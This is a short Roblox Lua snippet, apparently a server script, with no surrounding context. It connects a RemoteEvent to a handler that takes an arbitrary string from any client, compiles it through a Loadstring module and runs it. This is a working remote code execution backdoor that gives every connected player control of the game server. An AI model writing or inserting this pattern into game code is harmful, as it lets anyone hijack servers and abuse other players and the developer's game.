remote.OnServerEvent:Connect(function(player, getstuff) 
	require(script.Loadstring)(getstuff)()
end)
